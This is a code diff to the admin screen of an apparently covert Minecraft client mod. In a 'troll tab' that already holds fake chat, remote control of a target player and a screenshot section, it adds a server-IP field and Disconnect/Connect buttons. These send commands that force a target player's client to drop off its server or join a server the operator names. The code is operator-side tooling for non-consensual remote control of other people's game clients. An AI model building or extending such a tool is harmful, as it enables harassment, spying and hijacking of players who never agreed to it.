@@ -65,6 +65,7 @@ public final class AdminScreen extends Screen {
 
     private TextFieldWidget addField;
     private TextFieldWidget chatField;  // fake chat input in troll tab
+    private TextFieldWidget connectField; // server IP input in troll tab
     private ButtonWidget sendBtn;       // send button for fake chat
     private String feedback = null;
     private boolean feedbackOk = true;
@@ -146,6 +147,14 @@ public final class AdminScreen extends Screen {
                 .dimensions(px + panelW - PAD - 72, inputY, 72, 20).build();
         sendBtn.visible = (activeTab == 1);
         addDrawableChild(sendBtn);
+
+        // Server IP input field for connect command (in footer, above chat field)
+        connectField = new TextFieldWidget(textRenderer,
+                px + PAD, inputY - 24, panelW - PAD * 2 - 80, 20, Text.literal(""));
+        connectField.setMaxLength(256);
+        connectField.setPlaceholder(Text.literal("\u00a78Server-IP eingeben (z.B. mc.server.de)"));
+        connectField.setVisible(activeTab == 1);
+        addDrawableChild(connectField);
     }
 
     private void addPlayer() {
@@ -571,6 +580,33 @@ public final class AdminScreen extends Screen {
         ctx.drawCenteredTextWithShadow(textRenderer,
                 Text.literal("\u00a7d\uD83C\uDFAE Fernsteuerung"),
                 px + panelW / 2, cy + 7, 0xFFDD99FF);
+        cy += 30;
+
+        // ─ Server Control section ─
+        drawSectionHeader(ctx, textRenderer, px + PAD, cy, contentW,
+                "\u00a7c\u2301 Server-Kontrolle", 0xFFFF5555, t);
+        cy += 18;
+
+        // Disconnect button (half width)
+        int scHalfW = (contentW - 8) / 2;
+        int dcX = px + PAD;
+        boolean dcHov = mx >= dcX && mx <= dcX + scHalfW && my >= cy && my < cy + 22;
+        ctx.fill(dcX, cy, dcX + scHalfW, cy + 22, dcHov ? 0x55FF2222 : 0x33AA1111);
+        ctx.fill(dcX, cy, dcX + 3, cy + 22, 0xFFFF4444);
+        ctx.fill(dcX, cy, dcX + scHalfW, cy + 1, 0xFFFF4444);
+        ctx.fill(dcX, cy + 21, dcX + scHalfW, cy + 22, 0xFFFF4444);
+        ctx.drawCenteredTextWithShadow(textRenderer, Text.literal("\u00a7c\u2716 Disconnect"),
+                dcX + scHalfW / 2, cy + 7, 0xFFFF5555);
+
+        // Connect button (half width, right side)
+        int cnX = px + PAD + scHalfW + 8;
+        boolean cnHov = mx >= cnX && mx <= cnX + scHalfW && my >= cy && my < cy + 22;
+        ctx.fill(cnX, cy, cnX + scHalfW, cy + 22, cnHov ? mixA(0xFF44CC44, 0x33FFFFFF) : 0x33116611);
+        ctx.fill(cnX, cy, cnX + 3, cy + 22, 0xFF44CC44);
+        ctx.fill(cnX, cy, cnX + scHalfW, cy + 1, 0xFF44CC44);
+        ctx.fill(cnX, cy + 21, cnX + scHalfW, cy + 22, 0xFF44CC44);
+        ctx.drawCenteredTextWithShadow(textRenderer, Text.literal("\u00a7a\u2192 Connect"),
+                cnX + scHalfW / 2, cy + 7, 0xFF55FF55);
         cy += 30;
 
         // ─ Screenshot section ─
@@ -1263,6 +1299,30 @@ public final class AdminScreen extends Screen {
             // Remote Control button (full width)
             if (mx >= px + PAD && mx <= px + PAD + contentW && my >= cy && my < cy + 22) {
                 client.setScreen(new RemoteControlScreen(this, target));
+                return true;
+            }
+            cy += 30;
+
+            // Server Control section header
+            cy += 18;
+
+            // Disconnect + Connect buttons (side by side)
+            int scHalfW = (contentW - 8) / 2;
+            int dcX = px + PAD;
+            if (mx >= dcX && mx <= dcX + scHalfW && my >= cy && my < cy + 22) {
+                AdminConfig.sendTrollCommand(target, "DISCONNECT");
+                setFeedback("\u00a7c\u2716 Disconnect \u00a77\u2192 \u00a7f" + target, true);
+                return true;
+            }
+            int cnX = px + PAD + scHalfW + 8;
+            if (mx >= cnX && mx <= cnX + scHalfW && my >= cy && my < cy + 22) {
+                String ip = connectField != null ? connectField.getText().trim() : "";
+                if (ip.isEmpty()) {
+                    setFeedback("\u00a7cBitte Server-IP eingeben!", false);
+                } else {
+                    AdminConfig.sendTrollCommand(target, "CONNECT:" + ip);
+                    setFeedback("\u00a7a\u2192 Connect zu " + ip + " \u00a77\u2192 \u00a7f" + target, true);
+                }
                 return true;
             }
             cy += 30;
